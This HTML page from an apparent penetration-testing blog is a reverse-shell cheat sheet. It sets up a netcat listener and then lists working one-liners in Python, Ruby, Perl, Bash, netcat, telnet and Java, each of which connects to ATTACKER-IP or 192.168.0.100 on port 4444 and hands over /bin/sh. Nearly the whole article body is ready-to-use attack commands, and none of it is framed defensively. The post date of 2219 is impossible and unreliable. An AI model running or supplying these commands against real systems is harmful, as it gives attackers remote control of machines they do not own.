<!DOCTYPE html>



 <html class="no-js"> 
<head>
    <title>Reverse Shells  &middot; KCSEC </title>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta http-equiv="content-language" content="en-us" />
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="author" content="K.C">
    <meta name="description" content="KSEC Security Blog">
    <meta name="generator" content="Hugo 0.24.1" />

    <!-- Stylesheets -->
    <link rel="stylesheet" href="https://www.ivoidwarranties.tech/css/smooth-scrollbar.css" />
    <link rel="stylesheet" type="text/css" href="https://www.ivoidwarranties.tech/css/main.css" />
    <link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/8.6/styles/tomorrow.min.css" />
    

    <style>
        .posts li {
            visibility: hidden;
        }
    </style> 
</head>
<body>
    
    

    <header>	
	<div class="h-wrap">
		
		<h1 class="title"><a href="https://www.ivoidwarranties.tech/">KCSEC</a></h1>
		
	</div>
</header>
    
    <div class="site-wrapper" id="full-wrapper">
        
        <section class="single-wrap">
            <article class="single-content" itemscope itemtype="//schema.org/BlogPosting">
                <div class="feat">
                    <h5 class="page-date">
                    <time datetime="" itemprop="datePublished">
                    16 December 2219
                   
                    </time>
                    </h5>
                </div>
                <h1 class="page-title" itemprop="name headline">Reverse Shells</h1>
                <div itemprop="articleBody">
                    <p>Step one - Setup your Listener on attacking machine.</p>

<pre><code>nc -lvp &lt;Port&gt;

#Example

nc -lvp 4444
</code></pre>

<p>You can then use netcat to connect to that listener or a different reverse shell from the Target.</p>

<pre><code>nc &lt;attacker_ip&gt; &lt;port&gt;
 
#Example:

nc -l -v 192.168.225.143 4444
</code></pre>

<p>Here is a listener setup with NETCAT but the reverse shell is PERL.</p>

<p><img src="/img/ReverseShells/Netcat-basics-Reverse-shell-perl.jpg" alt="NCL1" /></p>

<p>PYTHON Reverse Shell</p>

<pre><code>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;ATTACKER-IP&quot;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'
</code></pre>

<p>RUBY Reverse Shell</p>

<pre><code>ruby -rsocket -e'f=TCPSocket.open(&quot;ATTACKER-IP&quot;,4444).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)'
</code></pre>

<p>PERL Reverse Shell</p>

<pre><code>perl -e 'use socket;$i=&quot;192.168.0.100&quot;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};'


perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;192.168.0.100:4444&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;'
</code></pre>

<p>PERL - Windows based Systems</p>

<pre><code>perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,&quot;192.168.0.100:4444&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;'
</code></pre>

<p>BASH</p>

<pre><code>0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/ATTACKING-IP/4444; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196


exec 5&lt;&gt;/dev/tcp/ATTACKING-IP/4444
cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done  


bash -i &gt;&amp; /dev/tcp/ATTACKING-IP/4444 0&gt;&amp;1
</code></pre>

<p>NETCAT</p>

<pre><code>nc -e /bin/sh ATTACKING-IP 4444


/bin/sh | nc ATTACKING-IP 4444


rm -f /tmp/p; mknod /tmp/p p &amp;&amp; nc ATTACKING-IP 4444 0/tmp/p
</code></pre>

<p>TELNET</p>

<pre><code>rm -f /tmp/p; mknod /tmp/p p &amp;&amp; telnet ATTACKING-IP 4444 0/tmp/p


telnet ATTACKING-IP 4444 | /bin/bash | telnet ATTACKING-IP 443
</code></pre>

<p>JAVA</p>

<pre><code> r = Runtime.getRuntime()
 p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/ATTACKING-IP/4444;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])
 p.waitFor()
</code></pre>
                    
                </div>
                <div class="feat share">
                </div>
                
                <div id="disqus_thread"></div>
<script type="text/javascript">
    var disqus_shortname = 'kcivwdq';
    var disqus_identifier = 'https:\/\/www.ivoidwarranties.tech\/posts\/pentesting-tuts\/pentesting-reverse-shells\/';
    var disqus_title = 'Reverse Shells';
    var disqus_url = 'https:\/\/www.ivoidwarranties.tech\/posts\/pentesting-tuts\/pentesting-reverse-shells\/';

    (function() {
        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
                
            </article>
        </section>

        <footer>
	
	<small>KCSEC</small>
	
</footer>
    </div>

    <div class="next-prev-arrows">
        
            <a rel="next" href="https://www.ivoidwarranties.tech/posts/pentesting-tuts/netcat/cheatsheet/" id="next">
                &larr; <span class="nav-title nav-title-next">NetCat CheatSheet</span> 
            </a>
        
        
            <a rel="prev" href="https://www.ivoidwarranties.tech/posts/pentesting-tuts/thefatrat/backdoor-exe/" id="prev">
                 <span class="nav-title nav-title-prev">TheFatRat - Backdoor EXE</span> &rarr;
            </a>
        
    </div>

    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/2.1.4/jquery.min.js"></script>
<script src="https://www.ivoidwarranties.tech/js/scrollreveal.min.js"></script>
<script type='application/javascript' src='https://www.ivoidwarranties.tech/js/smooth-scrollbar.js'></script>
<script src="https://www.ivoidwarranties.tech/js/baffle.min.js"></script>
<script src="https://www.ivoidwarranties.tech/js/main.js"></script>



<script>
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

ga('create', 'UA-103162154-1', 'auto');
ga('send', 'pageview');
</script>



<!-- Syntax highlighting -->
<script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/8.6/highlight.min.js"></script>
<script>hljs.initHighlightingOnLoad();</script>
</body>
</html>
